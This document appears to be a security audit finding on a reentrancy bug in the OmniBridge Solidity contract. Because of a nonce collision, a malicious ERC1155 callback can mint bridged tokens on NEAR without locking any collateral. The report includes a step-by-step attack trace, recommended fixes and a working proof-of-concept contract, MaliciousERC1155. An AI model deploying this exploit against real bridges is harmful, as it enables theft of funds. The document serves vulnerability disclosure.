### Title
Re-entrancy via Malicious Token Callback Causes `currentOriginNonce` Collision, Enabling Unauthorized Minting on NEAR - (File: evm/src/omni-bridge/contracts/OmniBridge.sol)

### Summary

`initTransfer` and `initTransfer1155` in `OmniBridge.sol` increment `currentOriginNonce` before an external token call, but emit the `InitTransfer` event using the live value of `currentOriginNonce` **after** the external call returns. A malicious token with a re-entrant hook can increment `currentOriginNonce` a second time during the external call, causing both the re-entrant invocation and the original invocation to emit `InitTransfer` events with the **same** `origin_nonce`. The NEAR side processes the first event (which may have no tokens actually locked on EVM) and mints/releases tokens, while the second event is rejected as a duplicate nonce.

### Finding Description

In `initTransfer1155`:

```
currentOriginNonce += 1;                          // Line 448 — nonce = N+1
...
IERC1155(tokenAddress).safeTransferFrom(          // Line 458 — external call
    msg.sender, address(this), tokenId, amount, ""
);
...
emit BridgeTypes.InitTransfer(
    msg.sender, deterministicToken,
    currentOriginNonce,                           // Line 483 — reads live storage
    amount, fee, nativeFee, recipient, message
);
``` [1](#0-0) 

The same pattern exists in `initTransfer` for ERC20 tokens: [2](#0-1) 

Neither function uses a `nonReentrant` modifier, and no `ReentrancyGuard` is imported.

**Attack trace for `initTransfer1155`:**

1. Attacker deploys a malicious ERC1155 token whose `safeTransferFrom` calls back into `initTransfer1155` before completing.
2. Attacker calls `logMetadata1155` (permissionless) to register the token; NEAR processes the `LogMetadata` event and registers the token.
3. Attacker calls `initTransfer1155(maliciousToken, ...)`:
   - `currentOriginNonce` → N+1
   - `IERC1155(maliciousToken).safeTransferFrom(...)` is called
   - Inside the malicious token, `initTransfer1155` is called again (re-entrancy):
     - `currentOriginNonce` → N+2
     - Malicious token's inner `safeTransferFrom` returns immediately (no tokens transferred)
     - Re-entrant call emits `InitTransfer` with `origin_nonce = N+2` ← **no tokens locked**
   - Outer call resumes; `currentOriginNonce` is now N+2
   - Outer call emits `InitTransfer` with `origin_nonce = N+2` ← **tokens locked**
4. Transaction log contains two `InitTransfer` events with `origin_nonce = N+2`. The re-entrant event appears first.
5. NEAR processes the first event (re-entrant, no EVM collateral) and mints tokens to the attacker.
6. NEAR rejects the second event as a duplicate `TransferId`.
7. Nonce N+1 is permanently skipped.

The `onERC1155Received` hook on the bridge is declared `view` and cannot prevent this: [3](#0-2) 

The malicious token can call `initTransfer1155` from within its own `safeTransferFrom` body, before invoking `onERC1155Received` on the bridge.

### Impact Explanation

The NEAR side's `fin_transfer_callback` uses `origin_nonce` as the unique `TransferId` key. When two `InitTransfer` events share the same `origin_nonce`, the first one processed causes NEAR to mint or release tokens. Because the re-entrant event is emitted first in the transaction log and carries no actual EVM collateral, the attacker receives bridged assets on NEAR without locking the corresponding ERC1155 (or ERC20) tokens on EVM. This is unauthorized minting of bridged funds — a critical bridge invariant violation. [4](#0-3) 

The NEAR `fin_transfer_callback` stores the transfer by `TransferId { origin_chain, origin_nonce }`. The second event with the same nonce would be rejected at `add_fin_transfer` or `pending_transfers` insertion, confirming only one event is honored.

### Likelihood Explanation

- `logMetadata1155` is explicitly permissionless — any address can register any ERC1155 token.
- No `nonReentrant` guard exists on `initTransfer` or `initTransfer1155`.
- ERC1155 tokens with arbitrary `safeTransferFrom` logic are a standard attack surface (analogous to ERC777 hooks for ERC20).
- The attacker needs only to deploy a malicious ERC1155 contract and call two public functions. [5](#0-4) 

### Recommendation

1. **Capture the nonce into a local variable before any external call** and use that local variable in `initTransferExtension` and `emit`:

```solidity
function initTransfer1155(...) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
    currentOriginNonce += 1;
    uint64 nonce = currentOriginNonce;  // capture before external call
    ...
    IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), tokenId, amount, "");
    ...
    emit BridgeTypes.InitTransfer(msg.sender, deterministicToken, nonce, ...);
}
```

Apply the same fix to `initTransfer`.

2. **Add `ReentrancyGuard` (`nonReentrant` modifier)** to both `initTransfer` and `initTransfer1155` as defense-in-depth, consistent with the stated security invariant in `evm/CLAUDE.md`: [6](#0-5) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface IOmniBridge {
    function initTransfer1155(
        address tokenAddress, uint256 tokenId, uint128 amount,
        uint128 fee, uint128 nativeFee, string calldata recipient, string calldata message
    ) external payable;
}

contract MaliciousERC1155 {
    IOmniBridge bridge;
    bool reentered;

    constructor(address _bridge) { bridge = IOmniBridge(_bridge); }

    // Minimal ERC1155 interface
    function safeTransferFrom(address, address, uint256 tokenId, uint256 amount, bytes calldata) external {
        if (!reentered) {
            reentered = true;
            // Re-enter with 0 actual token transfer (this call does nothing on second entry)
            bridge.initTransfer1155(address(this), tokenId, uint128(amount), 0, 0, "attacker.near", "");
            reentered = false;
        }
        // On re-entrant call: return without transferring tokens
        // On original call: also return without transferring tokens (attacker keeps ERC1155)
    }

    function balanceOf(address, uint256) external pure returns (uint256) { return 1e18; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    // ... minimal ERC1155 stubs
}
```

**Result**: Two `InitTransfer` events emitted with the same `origin_nonce`. NEAR processes the first (re-entrant, no tokens locked) and mints tokens to `attacker.near`. The attacker retains their ERC1155 tokens on EVM while receiving bridged value on NEAR.
